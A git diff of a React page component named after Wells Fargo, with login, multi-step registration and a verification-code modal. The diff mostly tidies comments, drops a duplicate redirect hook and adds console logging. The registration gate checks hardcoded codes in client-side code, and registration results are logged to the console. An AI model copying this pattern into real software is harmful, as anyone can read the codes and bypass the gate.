@@ -8,7 +8,7 @@ const SecurityVerificationModal = ({ isOpen, onClose, onVerify }) => {
   const [verificationCode, setVerificationCode] = useState('');
   const [error, setError] = useState('');
 
-  // Valid verification codes - same as in Navbar
+  // Valid verification codes
   const validCodes = ['WFBPLC09!', 'WFBUSA09!', 'WFBAFC09!', 'WFBEUR09!'];
 
   // Reset form when modal opens/closes
@@ -103,10 +103,10 @@ const WellsFargoPage = () => {
   const [savedUsername, setSavedUsername] = useState('');
   const [passwordStrength, setPasswordStrength] = useState('');
   
-  // New state for security verification modal
+  // Security verification modal state
   const [securityModalOpen, setSecurityModalOpen] = useState(false);
 
-  // Add navigation hook
+  // Navigation hooks
   const navigate = useNavigate();
   const location = useLocation();
 
@@ -122,13 +122,12 @@ const WellsFargoPage = () => {
     register
   } = useAuth();
 
-  // Modified: Only redirect to dashboard if user is logged in AND we're not explicitly
-  // showing a login/register modal from a link click
+  // Only redirect to dashboard if user is logged in AND not showing modal from link click
   useEffect(() => {
     const isModalTriggeredByLink = location.state?.showLogin || location.state?.showRegister;
     
     if (currentUser && !isModalTriggeredByLink) {
-      // If user is logged in and no modal request from link, just close the modal if open
+      // If user is logged in and no modal request from link, close modal if open
       if (isModalOpen) {
         closeModal();
       }
@@ -141,16 +140,13 @@ const WellsFargoPage = () => {
   useEffect(() => {
     if (location.state?.showLogin) {
       openLoginModal();
-      // DON'T clear the state yet - we need it for the currentUser check above
     } else if (location.state?.showRegister) {
       // Instead of directly opening register modal, open the security verification first
       openSecurityVerificationForRegister();
-      // DON'T clear the state yet - we need it for the currentUser check above
     }
   }, [location.state]);
 
-  // Add this new useEffect to handle clearing state after modals are shown
-  // This prevents the modal from reopening on page refresh
+  // Clear state after modals are shown to prevent reopening on page refresh
   useEffect(() => {
     if (isModalOpen && (location.state?.showLogin || location.state?.showRegister)) {
       // Clear the state, but only after the modal is already open
@@ -187,21 +183,6 @@ const WellsFargoPage = () => {
       setPasswordStrength('');
     }
   }, [formData.password]);
-
-  useEffect(() => {
-    console.log("Current user state changed:", currentUser);
-    const isModalTriggeredByLink = location.state?.showLogin || location.state?.showRegister;
-    
-    if (currentUser && !isModalTriggeredByLink) {
-      console.log("User logged in, redirecting to dashboard");
-      // If user is logged in and no modal request from link, just close the modal if open
-      if (isModalOpen) {
-        closeModal();
-      }
-      // Redirect to dashboard 
-      navigate('/dashboard');
-    }
-  }, [currentUser, isModalOpen, navigate, location.state]);
   
   const checkPasswordStrength = (password) => {
     if (!password) return '';
@@ -229,7 +210,7 @@ const WellsFargoPage = () => {
     setLoginError('');
   };
 
-  // New method to handle opening security verification for register
+  // Method to handle opening security verification for register
   const openSecurityVerificationForRegister = () => {
     setSecurityModalOpen(true);
   };
@@ -243,7 +224,7 @@ const WellsFargoPage = () => {
     setFormStep(1);
   };
 
-  // Modified register button click handler
+  // Register button click handler
   const openRegisterModal = () => {
     openSecurityVerificationForRegister();
   };
@@ -424,7 +405,7 @@ const WellsFargoPage = () => {
     setFormStep(formStep - 1);
   };
 
-  // Updated handleRegister function to fix registration flow
+  // Updated handleRegister function with improved error handling
   const handleRegister = async (e) => {
     e.preventDefault();
     setRegisterError('');
@@ -450,19 +431,23 @@ const WellsFargoPage = () => {
         dateOfBirth: formData.dateOfBirth,
         securityQuestion: formData.securityQuestion,
         securityAnswer: formData.securityAnswer,
-        // Add this explicit name field
+        // Add explicit name field
         name: `${formData.firstName} ${formData.lastName}`
       };
 
-      // Use register function from AuthContext
+      console.log("Submitting registration data...");
       const result = await register(userData);
+      
+      console.log("Registration result:", result);
+      
       if (!result.success) {
         setRegisterError(result.error || 'Registration failed. Please try again.');
       } else {
-        // Success - modal will close and redirect in useEffect when currentUser updates
+        // Success - close modal and redirect will happen in useEffect when currentUser updates
         closeModal();
       }
     } catch (error) {
+      console.error("Registration submission error:", error);
       setRegisterError('An unexpected error occurred. Please try again.');
     }
   };
